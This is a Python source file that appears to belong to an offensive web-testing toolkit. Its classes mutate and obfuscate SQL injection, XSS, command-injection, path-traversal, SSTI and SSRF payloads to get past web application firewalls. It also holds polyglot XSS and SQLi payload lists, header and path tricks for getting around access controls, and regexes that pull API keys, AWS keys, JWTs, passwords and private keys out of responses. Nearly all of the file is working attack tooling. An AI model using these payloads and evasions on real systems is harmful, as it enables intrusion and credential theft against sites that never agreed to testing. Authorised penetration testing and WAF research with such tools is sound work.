import re
import random
import urllib.parse
import base64
import html
from typing import List, Dict, Callable, Pattern, Set


MatchTransformer = Callable[[re.Match], List[str]]
PatternRule = tuple[Pattern, MatchTransformer]


class RegexMutator:
    def __init__(self):
        self._cache: Dict[str, List[str]] = {}
        self._compile_patterns()
    
    def _compile_patterns(self):
        self.patterns: Dict[str, List[PatternRule]] = {
            "sqli": [
                (re.compile(r"\bSELECT\b", re.I), self._case_variations),
                (re.compile(r"\bUNION\b", re.I), self._case_variations),
                (re.compile(r"\bFROM\b", re.I), self._inline_comment),
                (re.compile(r"\bWHERE\b", re.I), self._inline_comment),
                (re.compile(r"\s+"), self._whitespace_bypass),
                (re.compile(r"'"), self._quote_bypass),
                (re.compile(r"="), self._equals_bypass),
                (re.compile(r"\bOR\b", re.I), self._logical_bypass),
                (re.compile(r"\bAND\b", re.I), self._logical_bypass),
            ],
            "xss": [
                (re.compile(r"<script", re.I), self._tag_bypass),
                (re.compile(r"javascript:", re.I), self._proto_bypass),
                (re.compile(r"on\w+=", re.I), self._event_bypass),
                (re.compile(r"alert\(", re.I), self._func_bypass),
                (re.compile(r"<"), self._bracket_encode),
                (re.compile(r">"), self._bracket_encode),
            ],
            "cmdi": [
                (re.compile(r";"), self._cmd_separator),
                (re.compile(r"\|"), self._pipe_bypass),
                (re.compile(r"\s+"), self._ifs_bypass),
                (re.compile(r"`"), self._backtick_bypass),
            ],
            "lfi": [
                (re.compile(r"\.\.\/"), self._traversal_bypass),
                (re.compile(r"/etc/passwd"), self._path_encode),
                (re.compile(r"%00"), self._null_variant),
            ],
            "ssti": [
                (re.compile(r"\{\{"), self._template_bypass),
                (re.compile(r"\$\{"), self._expression_bypass),
                (re.compile(r"__\w+__"), self._dunder_bypass),
            ],
            "ssrf": [
                (re.compile(r"127\.0\.0\.1"), self._ip_bypass),
                (re.compile(r"localhost"), self._localhost_bypass),
                (re.compile(r"http://"), self._proto_wrap),
            ],
        }
        
        self.extractors: Dict[str, Pattern] = {
            "api_key": re.compile(r"(?:api[_-]?key|apikey)['\"]?\s*[:=]\s*['\"]?([a-zA-Z0-9\-_]{20,})", re.I),
            "aws_key": re.compile(r"(?:AKIA|ABIA|ACCA|ASIA)[A-Z0-9]{16}"),
            "jwt": re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"),
            "password": re.compile(r"(?:password|passwd|pwd)['\"]?\s*[:=]\s*['\"]?([^'\"\s&]+)", re.I),
            "token": re.compile(r"(?:token|auth|bearer)['\"]?\s*[:=]\s*['\"]?([a-zA-Z0-9\-_.]+)", re.I),
            "email": re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"),
            "ipv4": re.compile(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b"),
            "credit_card": re.compile(r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b"),
            "ssh_key": re.compile(r"-----BEGIN (?:RSA|DSA|EC|OPENSSH) PRIVATE KEY-----"),
            "session_id": re.compile(r"(?:session|sess|sid)['\"]?\s*[:=]\s*['\"]?([a-zA-Z0-9]{16,})", re.I),
            "hash_md5": re.compile(r"\b[a-fA-F0-9]{32}\b"),
            "hash_sha1": re.compile(r"\b[a-fA-F0-9]{40}\b"),
            "hash_sha256": re.compile(r"\b[a-fA-F0-9]{64}\b"),
            "internal_ip": re.compile(r"\b(?:10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.(?:1[6-9]|2[0-9]|3[01])\.[0-9]{1,3}\.[0-9]{1,3}|192\.168\.[0-9]{1,3}\.[0-9]{1,3})\b"),
        }
    
    def _case_variations(self, match: re.Match) -> List[str]:
        word = match.group(0)
        return [
            word.upper(),
            word.lower(),
            word[0].upper() + word[1:].lower(),
            ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(word)),
            ''.join(c.lower() if i % 2 else c.upper() for i, c in enumerate(word)),
        ]
    
    def _inline_comment(self, match: re.Match) -> List[str]:
        word = match.group(0)
        mid = len(word) // 2
        return [
            word,
            f"{word[:mid]}/**/{word[mid:]}",
            f"{word[:1]}/**/{word[1:]}",
            f"/*!{word}*/",
            f"/*!50000{word}*/",
        ]
    
    def _whitespace_bypass(self, match: re.Match) -> List[str]:
        return [
            " ", "\t", "\n", "\r", "\r\n",
            "/**/", "/*! */", "%09", "%0a", "%0d",
            "%20", "%a0", "+",
        ]
    
    def _quote_bypass(self, match: re.Match) -> List[str]:
        return ["'", '"', "`", "%27", "%22", "\\'", "''", "\\x27"]
    
    def _equals_bypass(self, match: re.Match) -> List[str]:
        return ["=", " LIKE ", " REGEXP ", " RLIKE ", " IS ", "<>", "!="]
    
    def _logical_bypass(self, match: re.Match) -> List[str]:
        word = match.group(0).upper()
        if word == "OR":
            return ["OR", "||", " || ", "oR", "Or"]
        return ["AND", "&&", " && ", "aNd", "AnD"]
    
    def _tag_bypass(self, match: re.Match) -> List[str]:
        return [
            "<script", "<SCRIPT", "<ScRiPt", "<scr\x00ipt",
            "<svg/onload", "<img/onerror", "<body/onload",
            "%3Cscript", "\\x3cscript", "\\u003cscript",
            "<script ", "<script\t", "<script\n",
        ]
    
    def _proto_bypass(self, match: re.Match) -> List[str]:
        return [
            "javascript:", "JAVASCRIPT:", "JaVaScRiPt:",
            "java\tscript:", "java\nscript:", "java\rscript:",
            "jav&#x09;ascript:", "jav&#x0A;ascript:",
            "data:", "vbscript:",
        ]
    
    def _event_bypass(self, match: re.Match) -> List[str]:
        event = match.group(0)
        return [
            event, event.upper(), event.lower(),
            event.replace("=", " = "), event.replace("=", "%3d"),
        ]
    
    def _func_bypass(self, match: re.Match) -> List[str]:
        return [
            "alert(", "ALERT(", "al\\u0065rt(",
            "confirm(", "prompt(", "eval(",
            "console.log(", "document.write(",
        ]
    
    def _bracket_encode(self, match: re.Match) -> List[str]:
        char = match.group(0)
        if char == "<":
            return ["<", "%3C", "\\x3c", "\\u003c", "&lt;", "&#60;", "&#x3c;"]
        return [">", "%3E", "\\x3e", "\\u003e", "&gt;", "&#62;", "&#x3e;"]
    
    def _cmd_separator(self, match: re.Match) -> List[str]:
        return [";", "%0a", "\n", "&&", "||", "|", "&"]
    
    def _pipe_bypass(self, match: re.Match) -> List[str]:
        return ["|", "%7c", "\\x7c", " | ", "||"]
    
    def _ifs_bypass(self, match: re.Match) -> List[str]:
        return [" ", "${IFS}", "$IFS$9", "%09", "{,}", "\t", "$IFS"]
    
    def _backtick_bypass(self, match: re.Match) -> List[str]:
        return ["`", "$(", ")", "${", "}"]
    
    def _traversal_bypass(self, match: re.Match) -> List[str]:
        return [
            "../", "..\\", "..%2f", "..%5c",
            "%2e%2e/", "%2e%2e%2f", "....//",
            "..;/", "..%00/", "..%0d%0a/",
        ]
    
    def _path_encode(self, match: re.Match) -> List[str]:
        path = match.group(0)
        return [
            path, urllib.parse.quote(path), 
            path.replace("/", "%2f"),
            path.replace("/", "\\"),
        ]
    
    def _null_variant(self, match: re.Match) -> List[str]:
        return ["%00", "\x00", "%2500", "%00%00"]
    
    def _template_bypass(self, match: re.Match) -> List[str]:
        return ["{{", "{%", "${", "#{", "<%= ", "${{"]
    
    def _expression_bypass(self, match: re.Match) -> List[str]:
        return ["${", "#{", "{{", "{%", "@{"]
    
    def _dunder_bypass(self, match: re.Match) -> List[str]:
        word = match.group(0)
        return [word, word.replace("__", "\\x5f\\x5f"), f"getattr(,'_{word[2:-2]}_')"]
    
    def _ip_bypass(self, match: re.Match) -> List[str]:
        return [
            "127.0.0.1", "127.1", "127.0.1", "0177.0.0.1",
            "0x7f.0.0.1", "2130706433", "0x7f000001",
            "017700000001", "[::ffff:127.0.0.1]",
        ]
    
    def _localhost_bypass(self, match: re.Match) -> List[str]:
        return [
            "localhost", "LOCALHOST", "Localhost",
            "localtest.me", "spoofed.burpcollaborator.net",
            "127.0.0.1", "[::1]", "0.0.0.0",
        ]
    
    def _proto_wrap(self, match: re.Match) -> List[str]:
        return [
            "http://", "https://", "//", "http:\\\\",
            "hTtP://", "HTTP://", "file://", "gopher://",
        ]
    
    def mutate(self, payload: str, category: str, max_mutations: int = 50) -> List[str]:
        cache_key = f"{category}:{payload}"
        if cache_key in self._cache:
            return self._cache[cache_key]
        
        mutations: Set[str] = {payload}
        patterns = self.patterns.get(category, [])
        
        for pattern, transformer in patterns:
            match = pattern.search(payload)
            if match:
                variations = transformer(match)
                for var in variations[:5]:
                    try:
                        escaped_var = var.replace("\\", "\\\\")
                        mutated = pattern.sub(escaped_var, payload, count=1)
                        if mutated != payload:
                            mutations.add(mutated)
                    except:
                        start, end = match.start(), match.end()
                        mutated = payload[:start] + var + payload[end:]
                        if mutated != payload:
                            mutations.add(mutated)
                    if len(mutations) >= max_mutations:
                        break
        
        result = list(mutations)[:max_mutations]
        self._cache[cache_key] = result
        return result
    
    def extract_secrets(self, text: str) -> Dict[str, List[str]]:
        found: Dict[str, List[str]] = {}
        for name, pattern in self.extractors.items():
            matches = pattern.findall(text)
            if matches:
                if isinstance(matches[0], tuple):
                    matches = [m[0] if isinstance(m, tuple) else m for m in matches]
                found[name] = list(set(matches))
        return found
    
    def extract_all(self, text: str, pattern_name: str) -> List[str]:
        pattern = self.extractors.get(pattern_name)
        if not pattern:
            return []
        matches = pattern.findall(text)
        if matches and isinstance(matches[0], tuple):
            return [m[0] for m in matches]
        return list(set(matches))
    
    def create_template_variants(self, template: str, placeholders: Dict[str, List[str]]) -> List[str]:
        variants = [template]
        for placeholder, values in placeholders.items():
            new_variants = []
            for variant in variants:
                for value in values:
                    new_variants.append(variant.replace(f"{{{placeholder}}}", value))
            variants = new_variants
        return variants
    
    def generate_from_pattern(self, regex_pattern: str, samples: int = 10) -> List[str]:
        try:
            import string
            results = []
            charset = string.ascii_letters + string.digits + "_-"
            for _ in range(samples):
                result = ""
                i = 0
                while i < len(regex_pattern):
                    char = regex_pattern[i]
                    if char == "\\":
                        if i + 1 < len(regex_pattern):
                            next_char = regex_pattern[i + 1]
                            if next_char == "d":
                                result += random.choice(string.digits)
                            elif next_char == "w":
                                result += random.choice(charset)
                            elif next_char == "s":
                                result += " "
                            else:
                                result += next_char
                            i += 2
                            continue
                    elif char in ".+*?[](){}|^$":
                        if char == ".":
                            result += random.choice(charset)
                        i += 1
                        continue
                    else:
                        result += char
                    i += 1
                if result:
                    results.append(result)
            return results
        except:
            return []


_regex_mutator: RegexMutator = None


def get_regex_mutator() -> RegexMutator:
    global _regex_mutator
    if _regex_mutator is None:
        _regex_mutator = RegexMutator()
    return _regex_mutator


class Obfuscator:
    def __init__(self):
        self.techniques = {
            "encoding": [
                self.url_encode_selective,
                self.double_url_encode,
                self.triple_url_encode,
                self.unicode_escape,
                self.hex_escape,
                self.octal_escape,
                self.html_entity_decimal,
                self.html_entity_hex,
                self.html_entity_named,
                self.overlong_utf8,
                self.utf7_encode,
                self.utf16_encode,
            ],
            "case": [
                self.random_case,
                self.alternating_case,
                self.inverse_case,
            ],
            "whitespace": [
                self.tab_substitute,
                self.newline_substitute,
                self.carriage_substitute,
                self.vertical_tab,
                self.form_feed,
                self.null_byte_insert,
                self.zero_width_chars,
            ],
            "comments": [
                self.sql_inline_comment,
                self.sql_multiline_comment,
                self.sql_version_comment,
                self.html_comment_break,
                self.js_comment_break,
            ],
            "concatenation": [
                self.string_concat_plus,
                self.string_concat_pipe,
                self.char_code_build,
                self.fromcharcode_build,
            ],
            "splitting": [
                self.split_keywords,
                self.reverse_payload,
                self.chunk_and_join,
            ],
        }
    
    def obfuscate(self, payload: str, techniques: List[str] = None, max_variants: int = 50) -> List[str]:
        variants = {payload}
        use_techniques = techniques or list(self.techniques.keys())
        
        for tech_name in use_techniques:
            if tech_name in self.techniques:
                for method in self.techniques[tech_name]:
                    try:
                        result = method(payload)
                        if result and result != payload:
                            variants.add(result)
                        if len(variants) >= max_variants:
                            return list(variants)
                    except:
                        pass
        
        return list(variants)
    
    def url_encode_selective(self, payload: str) -> str:
        special = set("<>\"'&;|`$(){}[]\\")
        return ''.join(f"%{ord(c):02X}" if c in special else c for c in payload)
    
    def double_url_encode(self, payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
    
    def triple_url_encode(self, payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe=''), safe='')
    
    def unicode_escape(self, payload: str) -> str:
        return ''.join(f"\\u{ord(c):04x}" if c.isalpha() else c for c in payload)
    
    def hex_escape(self, payload: str) -> str:
        return ''.join(f"\\x{ord(c):02x}" if ord(c) < 128 else c for c in payload)
    
    def octal_escape(self, payload: str) -> str:
        return ''.join(f"\\{ord(c):03o}" if c.isalpha() else c for c in payload)
    
    def html_entity_decimal(self, payload: str) -> str:
        return ''.join(f"&#{ord(c)};" if c.isalpha() or c in "<>\"'" else c for c in payload)
    
    def html_entity_hex(self, payload: str) -> str:
        return ''.join(f"&#x{ord(c):x};" if c.isalpha() or c in "<>\"'" else c for c in payload)
    
    def html_entity_named(self, payload: str) -> str:
        entities = {"<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&apos;", "&": "&amp;"}
        return ''.join(entities.get(c, c) for c in payload)
    
    def overlong_utf8(self, payload: str) -> str:
        overlong = {
            "/": "%c0%af",
            ".": "%c0%2e",
            "<": "%c0%bc",
            ">": "%c0%be",
            "'": "%c0%a7",
            '"': "%c0%a2",
        }
        result = payload
        for char, enc in overlong.items():
            result = result.replace(char, enc)
        return result
    
    def utf7_encode(self, payload: str) -> str:
        try:
            return payload.encode('utf-7').decode('ascii')
        except:
            return payload
    
    def utf16_encode(self, payload: str) -> str:
        return ''.join(f"%u{ord(c):04x}" if ord(c) > 127 or c.isalpha() else c for c in payload)
    
    def random_case(self, payload: str) -> str:
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
    
    def alternating_case(self, payload: str) -> str:
        return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
    
    def inverse_case(self, payload: str) -> str:
        return payload.swapcase()
    
    def tab_substitute(self, payload: str) -> str:
        return payload.replace(" ", "\t")
    
    def newline_substitute(self, payload: str) -> str:
        return payload.replace(" ", "\n")
    
    def carriage_substitute(self, payload: str) -> str:
        return payload.replace(" ", "\r")
    
    def vertical_tab(self, payload: str) -> str:
        return payload.replace(" ", "\x0b")
    
    def form_feed(self, payload: str) -> str:
        return payload.replace(" ", "\x0c")
    
    def null_byte_insert(self, payload: str) -> str:
        return payload.replace(" ", "\x00")
    
    def zero_width_chars(self, payload: str) -> str:
        zwc = ["\u200b", "\u200c", "\u200d", "\ufeff"]
        result = ""
        for c in payload:
            result += c
            if c.isalpha() and random.random() > 0.7:
                result += random.choice(zwc)
        return result
    
    def sql_inline_comment(self, payload: str) -> str:
        keywords = ["SELECT", "FROM", "WHERE", "UNION", "AND", "OR", "INSERT", "UPDATE", "DELETE"]
        result = payload
        for kw in keywords:
            if kw in payload.upper():
                mid = len(kw) // 2
                result = re.sub(kw, f"{kw[:mid]}/**/{kw[mid:]}", result, flags=re.I)
        return result
    
    def sql_multiline_comment(self, payload: str) -> str:
        return payload.replace(" ", "/**/")
    
    def sql_version_comment(self, payload: str) -> str:
        versions = ["50000", "50001", "50100", "50500", "50600"]
        ver = random.choice(versions)
        return f"/*!{ver}{payload}*/"
    
    def html_comment_break(self, payload: str) -> str:
        if "<script" in payload.lower():
            return payload.replace("<script", "<!--><script")
        return payload
    
    def js_comment_break(self, payload: str) -> str:
        if "alert" in payload.lower():
            return payload.replace("alert", "al/**/ert")
        return payload
    
    def string_concat_plus(self, payload: str) -> str:
        if len(payload) < 5:
            return payload
        mid = len(payload) // 2
        return f"'{payload[:mid]}'/**/+/**/'{payload[mid:]}'"
    
    def string_concat_pipe(self, payload: str) -> str:
        if len(payload) < 5:
            return payload
        mid = len(payload) // 2
        return f"'{payload[:mid]}'||'{payload[mid:]}'"
    
    def char_code_build(self, payload: str) -> str:
        if len(payload) > 20:
            return payload
        codes = [str(ord(c)) for c in payload]
        return f"CHAR({','.join(codes)})"
    
    def fromcharcode_build(self, payload: str) -> str:
        if len(payload) > 30:
            return payload
        codes = [str(ord(c)) for c in payload]
        return f"String.fromCharCode({','.join(codes)})"
    
    def split_keywords(self, payload: str) -> str:
        splits = {
            "script": "scr\"+\"ipt",
            "alert": "al\"+\"ert",
            "document": "doc\"+\"ument",
            "cookie": "coo\"+\"kie",
            "eval": "ev\"+\"al",
        }
        result = payload
        for word, split in splits.items():
            result = re.sub(word, split, result, flags=re.I)
        return result
    
    def reverse_payload(self, payload: str) -> str:
        return payload[::-1]
    
    def chunk_and_join(self, payload: str) -> str:
        if len(payload) < 6:
            return payload
        chunks = [payload[i:i+3] for i in range(0, len(payload), 3)]
        return "'.join(['".join(chunks) + "'])"
    
    def get_polyglot_xss(self) -> List[str]:
        return [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "'\"-->]]>*/</script></style></title></textarea></noscript><script>alert(1)</script>",
            "'-alert(1)-'",
            "\"><img src=x onerror=alert(1)>",
            "javascript:alert(1)//",
            "data:text/html,<script>alert(1)</script>",
            "<svg/onload=alert(1)>",
            "<img src=x:alert(alt) onerror=eval(src) alt=1>",
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}",
        ]
    
    def get_polyglot_sqli(self) -> List[str]:
        return [
            "1'\"()[]{}|;:@#$%^&*-+=`~\\",
            "' OR ''='",
            "\" OR \"\"=\"",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "1' AND '1'='1",
            "1 UNION SELECT NULL--",
            "1' ORDER BY 1--+",
            "' HAVING 1=1--",
        ]


_obfuscator: Obfuscator = None


def get_obfuscator() -> Obfuscator:
    global _obfuscator
    if _obfuscator is None:
        _obfuscator = Obfuscator()
    return _obfuscator


class WAFBypass:
    def __init__(self):
        self.encoders = [
            self.no_encoding,
            self.url_encode,
            self.double_url_encode,
            self.unicode_encode,
            self.hex_encode,
            self.html_encode,
            self.mixed_case,
            self.add_nullbytes,
            self.add_comments,
            self.chunk_payload,
            self.base64_encode,
            self.random_case,
            self.random_padding,
        ]
    
    def generate_variants(self, payload, aggressive=False):
        variants = [payload]
        
        encoders = self.encoders if aggressive else self.encoders[:5]
        
        for encoder in encoders:
            try:
                encoded = encoder(payload)
                if encoded and encoded not in variants:
                    variants.append(encoded)
            except:
                pass
        
        return variants
    
    def no_encoding(self, payload):
        return payload
    
    def url_encode(self, payload):
        return urllib.parse.quote(payload)
    
    def double_url_encode(self, payload):
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    def unicode_encode(self, payload):
        result = ""
        for char in payload:
            if char.isalpha():
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result
    
    def hex_encode(self, payload):
        result = ""
        for char in payload:
            if char.isalpha() or char in "<>'\"":
                result += f"%{ord(char):02x}"
            else:
                result += char
        return result
    
    def html_encode(self, payload):
        return html.escape(payload)
    
    def mixed_case(self, payload):
        result = ""
        for i, char in enumerate(payload):
            if char.isalpha():
                result += char.upper() if i % 2 == 0 else char.lower()
            else:
                result += char
        return result
    
    def add_nullbytes(self, payload):
        return payload.replace(" ", "%00 ")
    
    def add_comments(self, payload):
        if "SELECT" in payload.upper():
            return payload.replace("SELECT", "SEL/**/ECT").replace("FROM", "FR/**/OM")
        if "<script" in payload.lower():
            return payload.replace("<script", "<scr\x00ipt")
        return payload
    
    def chunk_payload(self, payload):
        if len(payload) < 10:
            return payload
        mid = len(payload) // 2
        return payload[:mid] + "\r\n" + payload[mid:]
    
    def base64_encode(self, payload):
        return base64.b64encode(payload.encode()).decode()
    
    def random_case(self, payload):
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )
    
    def random_padding(self, payload):
        padding = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=random.randint(3, 8)))
        return f"{padding}/*{payload}*/{padding}"


class PayloadMutator:
    def __init__(self):
        self.regex_mutator = get_regex_mutator()
        
        self.sqli_mutations = [
            lambda p: p.replace("'", "\""),
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace(" ", "%09"),
            lambda p: p.replace(" ", "%0a"),
            lambda p: p.replace("=", " LIKE "),
            lambda p: p.replace("OR", "||"),
            lambda p: p.replace("AND", "&&"),
            lambda p: p + "--",
            lambda p: p + "#",
            lambda p: p + "/*",
            lambda p: "/*!50000" + p + "*/",
        ]
        
        self.xss_mutations = [
            lambda p: p.replace("<", "%3C").replace(">", "%3E"),
            lambda p: p.replace("<", "\\x3c").replace(">", "\\x3e"),
            lambda p: p.replace("<", "\\u003c").replace(">", "\\u003e"),
            lambda p: p.replace("script", "scr\x00ipt"),
            lambda p: p.replace("script", "scrIpt"),
            lambda p: p.replace("alert", "al\\u0065rt"),
            lambda p: p.replace("(", "`").replace(")", "`"),
            lambda p: p.replace("javascript:", "java\tscript:"),
            lambda p: p.replace("onerror", "ONERROR"),
            lambda p: p.replace("<script>", "<svg/onload="),
        ]
        
        self.cmdi_mutations = [
            lambda p: p.replace(";", "%0a"),
            lambda p: p.replace("|", "%7c"),
            lambda p: p.replace(" ", "${IFS}"),
            lambda p: p.replace(" ", "$IFS$9"),
            lambda p: p.replace(" ", "%09"),
            lambda p: p.replace(" ", "{,}"),
            lambda p: "'" + p + "'",
            lambda p: '"' + p + '"',
            lambda p: "`" + p + "`",
            lambda p: "$(" + p + ")",
        ]
    
    def mutate(self, payload: str, category: str, use_regex: bool = True) -> List[str]:
        mutations = set([payload])
        
        lambda_mutators = {
            "sqli": self.sqli_mutations,
            "xss": self.xss_mutations,
            "cmdi": self.cmdi_mutations,
        }
        
        if category in lambda_mutators:
            for mutator in lambda_mutators[category]:
                try:
                    mutated = mutator(payload)
                    if mutated:
                        mutations.add(mutated)
                except:
                    pass
        
        if use_regex:
            regex_mutations = self.regex_mutator.mutate(payload, category)
            mutations.update(regex_mutations)
        
        return list(mutations)
    
    def mutate_sqli(self, payload: str, use_regex: bool = True) -> List[str]:
        return self.mutate(payload, "sqli", use_regex)
    
    def mutate_xss(self, payload: str, use_regex: bool = True) -> List[str]:
        return self.mutate(payload, "xss", use_regex)
    
    def mutate_cmdi(self, payload: str, use_regex: bool = True) -> List[str]:
        return self.mutate(payload, "cmdi", use_regex)
    
    def mutate_lfi(self, payload: str) -> List[str]:
        return self.regex_mutator.mutate(payload, "lfi")
    
    def mutate_ssti(self, payload: str) -> List[str]:
        return self.regex_mutator.mutate(payload, "ssti")
    
    def mutate_ssrf(self, payload: str) -> List[str]:
        return self.regex_mutator.mutate(payload, "ssrf")
    
    def extract_secrets(self, text: str) -> Dict[str, List[str]]:
        return self.regex_mutator.extract_secrets(text)


class HeaderInjector:
    headers_to_test = [
        "X-Forwarded-For",
        "X-Forwarded-Host",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Custom-IP-Authorization",
        "X-Originating-IP",
        "X-Remote-IP",
        "X-Client-IP",
        "X-Real-IP",
        "X-Host",
        "X-Original-Host",
        "Forwarded",
        "True-Client-IP",
        "CF-Connecting-IP",
        "X-ProxyUser-Ip",
        "Client-IP",
    ]
    
    bypass_values = [
        "127.0.0.1",
        "localhost",
        "0.0.0.0",
        "::1",
        "127.0.0.1:80",
        "127.0.0.1:443",
        "10.0.0.1",
        "172.16.0.1",
        "192.168.1.1",
        "admin",
        "administrator",
    ]
    
    @classmethod
    def generate_bypass_headers(cls):
        headers_list = []
        for header in cls.headers_to_test:
            for value in cls.bypass_values:
                headers_list.append({header: value})
        return headers_list


class PathBypass:
    bypass_patterns = [
        "/{path}",
        "/{path}/",
        "/{path}//",
        "//{path}",
        "/./{path}",
        "/{path}/.",
        "/{path}%20",
        "/{path}%09",
        "/{path}%00",
        "/{path}..;/",
        "/{path};",
        "/{path}.json",
        "/{path}.html",
        "/{path}?",
        "/{path}??",
        "/{path}#",
        "/{path}/*",
        "/{path}.css",
        "/%2e/{path}",
        "/{path}%2f",
        "/{path}%2e%2e%2f",
    ]
    
    @classmethod
    def generate_bypasses(cls, path):
        bypasses = []
        clean_path = path.strip("/")
        for pattern in cls.bypass_patterns:
            bypasses.append(pattern.replace("{path}", clean_path))
        return bypasses
